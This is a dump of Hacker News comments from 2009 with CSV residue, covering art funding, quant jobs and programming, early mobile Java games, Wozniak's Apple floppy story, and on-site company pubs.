If you say to a funding body ""We want to look at the relationship between human beings and anthropomorphic robots!"" you get nothing, but if you say ""We want to look at the relationship between place and space and internal subjectivity through [blah blah blah]"" you get money to build cool robots and let them loose on the park.<p>The only flaw with the plan is that this kind of stuff leaks out of that confine and infects discourse outside of art funding bodies.",1239548200

Various friends of mine who are former mathematicians / physicists now working as quants do rock at stochastic calculus, but suck at C++. Maybe a solution would be to separate the coding tasks from the modeling tasks. A friend of mine recently took a quant position at a hedge fund, and while he gets to do a lot of modeling and data analysis, the actual implementation is carried out by a 1st rate coder with whom he works in tandem.

558473,comment,558364,558416,0,0,pavlov,,,"Indeed. There's no shortage of success stories in mobile development before Apple or Google came along, but they mostly took place a long way from Silicon Valley.<p>In 2004, I was working as a graphics artist for a Finnish startup that was in the business of making Java games for phones. The company had started with three founders two years earlier, and when I got there, they employed over 30 people and kept growing. They had struck deals with operators across Europe, and game sales were taking off in a serious way. (Ordinary people were buying millions of units of over-the-air distributed Java software for phones already in 2004 -- but I guess those that were successful in this market were not terribly interested in attracting competitors by making a lot of noise about it.)<p>The games were good enough that everybody could be proud of the work. On the best phones, the graphics and sound quality was on the level of Amiga or 386+VGA PCs. But more importantly, the games scaled down graciously to the most primitive color-screen phones with resolutions circa 128*80 pixels: thanks to a well-thought out set of APIs, an asset workflow designed for scalability and an extensive database of device capabilities, games could be easily built for dozens of devices.<p>I ended up leaving that job fairly quickly because I figured out I'd rather be pushing around millions of pixels on the GPU with code, rather than pushing around individual pixels in Photoshop manually. But I know the company was acquired by a large American corporation not long after, and I think the founders ended up very well rewarded for having created that rare combination of technical competence (the APIs and development process), marketing (the relationships with international operators) and artistic integrity (the games looked good and played well).",1239547709

Finance is not Theoretical Physics. In Physics, the best and brightest are in Academia and have access to high-quality experimental data (unless you're doing high-energy stuff, where experimental data is hard to get). In Finance, the best and brightest are in the financial services industry, and the finance academics have no access to high-quality data because such data costs millions. Data aside, the kind of Finance which is taught in college is somewhat of a fantasy. I will be crude and claim that Academic Finance is as scientific as literary criticism...<p>Cutting a long story short: anyone who's proficient at building models (like a physicist or a math-oriented engineer) can build models for a hedge fund without having been trained to do that in college. At D.E. Shaw they like to say that <i>""you can teach smart people how to do finance, but you can't teach financial people how to be smart""</i>.",1239547126

Then I got it to where it was reading the data in the right byte positions. Then I got it to work with shifting tracks, and we wanted a simple program where we would say ""run checkbook"" or ""run color math"" and it would run the programs that were stored on the floppy disk. So we went off to Las Vegas, and Randy and I worked all night and we got it done to where it was working. At the very end, it was 6:00 a.m. and I said, 'We have to back up this floppy disk."" We had one good disk that we prepared with the data hand-massaged to get it just right. So I stuck it in the floppy and wrote a little program, and I typed in some data and I said ""read track 0,"" stuck in the other floppy and said ""write track 0, read track 1, write track 1."" There were 36 tracks—I had to switch floppies back and forth.<p>When I got done, I'm looking at these 2 floppies that look just the same. And I decided that I might have written onto the good one from the bad, and I did. So I had lost it all. I went back to my hotel room. I slept for a while. I got up about 10:00 a.m. or so. I sat down and, out of my head and my listings, recreated everything, got it working again, and we showed it at the show. It was a huge hit. Everybody was saying, ""Oh my God, Apple has a floppy!"" It just looked beautiful, plugged into a slot on our computer. We were able to say ""run color math,"" and it just runs instantly. It was a change in time.<p>But the real eureka moment for me was the very first time I ever read data back. I wrote it on the floppy, which was easy, but read it back, got it right. I just died.<p>I think that Steve's entire interview is probably one of the most inspiring in Founders at Work:<p><a href=""http://www.foundersatwork.com/steve-wozniak.html"" rel=""nofollow"">http://www.foundersatwork.com/steve-wozniak.html</a>",1239546733

Such topics are usually grandiose, but in primitive times religion helped us begin to understand smaller problems, like local rainfall.<p>With that definition, it's obvious that religion isn't going anywhere anytime soon. Parts of it have split off into Hollywood, parts of it have split off into scientific inquiry. But the idea that we don't know everything? And that we have to use our creative minds together to come to some kind of hypothesis for things we do not understand?

It's much better received to have majored in math or computer science than business, at least for an undergrad.<p>It's also very unlikely that Soros is going to have an undergraduate building new quant models in his first year. If he's lucky, he might get to write the code to test someone else's models. There really isn't an undergraduate course that sets you up to be a quant, and most quant jobs are unattainable without a PhD.<p>An MFE degree (Master's in Financial Engineering) can give you the basic skills expected of a junior-level quant trader, but tends to underplay a critical component: programming.

After all, who wants to be the guy who helped set something up that ended up getting one of your people killed?<p>There was also problems with idle chat -- it's one thing to go out with your friends to an outside pub after work and trash talk your job and coworkers. It's called blowing off steam. You can't do that with all of those folks sitting right next to you! And of course, with more beer comes more blowing off steam. When size is small, people just get used to one another -- if you say something dumb on Friday afternoon, we're going to see you everyday next week, so we'll have to work things out. But in companies that are just a little bit larger, you don't have that family-type constant-interaction. Telling somebody over in purchasing that they have the heart of Satan might cause permanent damage.<p>And let's not even start talking about the significant percentage of the population with drinking or drug problems. Having a pub on-site is not exactly helping them out.<p>So even when it works, it's just not the same. Maybe when the company is small, like 50 or fewer, it has a real capability to bind everybody together. I'm not sure that the idea would scale to places the size of Microsoft, however.<p>And -- this is the kind of idea that gives corporate lawyers fits.<p>Having said all of that, I'm in favor of it. I just think it's a lot more complicated than some folks realize at first glance.",1239544906
